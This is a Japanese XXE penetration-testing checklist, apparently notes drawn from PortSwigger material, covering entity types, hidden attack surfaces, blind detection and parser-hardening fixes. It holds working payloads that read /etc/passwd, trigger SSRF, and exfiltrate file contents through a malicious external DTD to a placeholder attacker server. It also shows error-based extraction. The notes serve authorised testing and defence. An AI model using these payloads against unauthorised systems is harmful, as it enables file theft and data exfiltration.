# XXE(XML外部エンティティインジェクション) 診断チェックリスト

PortSwigger Web Security Academy の解説を読み、診断の手順として組み直したノートです。原文は転載していません。詳しい説明や演習は出典を見てください。

診断は、自分の管理下の環境か、書面で許可を得た対象にだけ行います。

## 1. 前提知識(XML実体)

- **カスタムエンティティ**: DTD内で`<!ENTITY myentity "値">`のように定義し、文書内で`&myentity;`と書くとその値に展開される。
- **外部エンティティ**: `SYSTEM`キーワードでURL(`http://`や`file://`)を指定し、その内容を実体の値として読み込む。`file://`を使えば、サーバー上の任意のファイルパスを読み込める。
- **パラメータエンティティ**: `%`を使う特殊な実体(`<!ENTITY % name "値">`、参照は`%name;`)。DTDの中でだけ参照できる。通常のエンティティがブロックされる場面で使うことがある(3章)。
- **DTDの種類**: 文書内に完全に書かれた**内部DTD**、外部から読み込む**外部DTD**、両者を組み合わせた**ハイブリッド**がある。

## 2. 疑う場所

- アプリがXML形式のデータをやり取りしている箇所全般(明示的なXML API)。
- **XInclude**: クライアントから送った値が、サーバー側でXML文書の一部(SOAPリクエストの中身など)に組み込まれ、その文書全体をパースしている場合。この場合、`DOCTYPE`要素を自分で定義・編集できないため、通常のXXEは使えないが、送信するデータ値の中に`XInclude`の名前空間を使った参照を書くことで、ファイルを読み込ませられることがある(`<xi:include parse="text" href="file:///etc/passwd"/>`)。
- **ファイルアップロード経由**: DOCX・SVGなど、内部がXMLで構成されているファイル形式。アプリがPNG/JPEGなどを想定していても、使っている画像処理ライブラリがSVGを受け付け、SVGとしてパースしてしまうことがある。
- **Content-Typeの変更**: 通常`application/x-www-form-urlencoded`で送られるリクエストでも、サーバーが`Content-Type: text/xml`のボディを許容してXMLとしてパースする場合がある。通常のフォーム送信をXML形式に変えて送るだけで、隠れたXXEの攻撃対象面に到達できることがある。

## 3. ファイル取得・SSRFとしての悪用(応答に出る場合)

1. 送信するXMLの`DOCTYPE`に外部エンティティを定義する。例: `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>`
2. 応答に出る既存のデータ値(例: `<productId>`)の中で、定義した実体(`&xxe;`)を使う。
3. 応答にファイルの内容が出るか確認する。実際の脆弱性では、応答に出る値が複数あるので、各データノードを個別に試す必要がある。

**SSRFとしての利用**: `SYSTEM`に指定するURLを、ファイルパスではなく内部システムのURL(`http://internal.example.com/`)にすれば、サーバーにそのURLへのリクエストを発生させられる。応答に実体の値が出れば、内部システムの応答を直接読める(双方向)。出なければ、ブラインドSSRF(4章)として扱う。

## 4. ブラインドXXE(応答に出ない場合)

定義した実体の値が応答に出ない場合でも、次の手口で検出・悪用できる。

### 4-1. OAST(Out-of-band)での検出

自分の管理するドメインへの外部エンティティを定義し、DNS・HTTPの着信で成立を確認する。

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://自分の管理ドメイン/"> ]>
```

通常のエンティティが、入力検証やパーサーの設定で止められている場合、パラメータエンティティを使うと通ることがある。

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://自分の管理ドメイン/"> %xxe; ]>
```

### 4-2. 外部DTDを使ったデータの持ち出し(OAST経由)

検出だけでなく、実際にファイルの内容を持ち出すには、攻撃者が管理するサーバーに悪意のあるDTDを置き、対象に読み込ませる。

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25;exfiltrate SYSTEM 'http://自分のサーバー/?x=%file;'>">
%eval;
%exfiltrate;
```

この悪意のあるDTDを自分のサーバー(`http://自分のサーバー/malicious.dtd`)に置き、対象に次を送る。

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://自分のサーバー/malicious.dtd"> %xxe;]>
```

対象のXMLパーサーが外部DTDを取得・評価し、ファイルの内容をクエリ文字列に乗せて自分のサーバーへのリクエストとして送ってくる。改行文字を含む内容(`/etc/passwd`そのものなど)は、URLとして送る過程で問題になることがあるため、通らない場合はFTPプロトコルを試すか、改行を含まないファイル(`/etc/hostname`など)を対象にする。

### 4-3. エラーメッセージ経由でのデータ取得

OASTでの持ち出しが使えない(外部通信がブロックされている)場合でも、アプリがXMLパースのエラーメッセージをそのまま返すなら、エラー文にファイルの内容を載せられることがある。

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25;error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

存在しないパス(`/nonexistent/`)にファイルの内容を連結して読み込もうとさせ、失敗時のエラーメッセージ(「そのファイルが見つからない」旨のメッセージ)にパスの一部として内容が出る。

### 4-4. 内部DTDしか使えない場合(ローカルDTDの再利用)

4-2・4-3の手口は、パラメータエンティティの定義の中でさらにパラメータエンティティを定義するという構造上、外部DTDでしか許可されない(多くのパーサーで、内部DTDでは拒否される)。外部通信もブロックされ、外部DTDを読み込めない場合は、サーバーのファイルシステム上に既にある外部DTDファイルを「再利用」する。

1. 内部DTDとハイブリッドにし、サーバー上に存在する既存のDTDファイル(例: `/usr/share/yelp/dtd/docbookx.dtd`)を`SYSTEM`で読み込む。
2. そのDTDファイルが定義しているエンティティ名を、再定義(上書き)して、4-3のエラーベースの手口に差し替える。
3. 再定義した実体を使うことで、エラーメッセージに目的のファイルの内容を出す。

**存在するDTDファイルの探し方**: アプリがパーサーのエラーをそのまま返すなら、候補となるDTDファイルパスを1つずつ`SYSTEM`で読み込ませてみて、エラーが出るか(存在しない)、出ないか(存在する)で特定できる。見つかったら、そのファイルの内容をオープンソースなどで入手し、再定義できるエンティティ名を確認する。

## 5. 誤検知・見落としやすい点

- 応答にファイルの内容が出ないからといって、XXE自体が無いと判断しない。ブラインドの可能性(4章)を必ず確認する。
- OASTでDNSの着信だけでHTTPの着信がない場合、SSRFと同様、ネットワークフィルタで止まっている可能性がある(別ノート「SSRF」参照)。
- XML以外の形式(JSONなど)しかやり取りしていないように見えても、`Content-Type`をXMLに変えて送ってみないと、アプリが実際にXMLを許容するかは分からない。
- ファイルアップロード機能は、受け付ける拡張子・MIMEタイプの指定だけでなく、実際に使われている処理ライブラリがSVGなどのXML系形式を許容していないか確認する。
- XMLを使った機能は、XXEだけでなく、XSSやSQLインジェクションの対象にもなりうる。XMLエスケープシーケンスで構文を保ったまま、他の脆弱性のペイロードを埋め込めないかも併せて確認する。

## 6. 対策(開発側への指摘事項)

- XMLパーサーで、外部エンティティの解決と`XInclude`のサポートを無効化する。多くのパーサーは、設定オプションやAPIの呼び出し方で無効化できる。アプリが実際に外部エンティティを必要としていないなら、無効化してもアプリの動作に影響しない。
- ライブラリ・APIのドキュメントで、安全なデフォルト設定になっているかを確認する(バージョンによって既定値が異なる場合がある)。
- ファイルアップロードで画像処理に使うライブラリが、意図しないフォーマット(SVGなど)を受理してしまわないか確認する。
- `Content-Type`に関わらずXMLとして解釈してしまう実装を避け、想定外のコンテントタイプは拒否する。
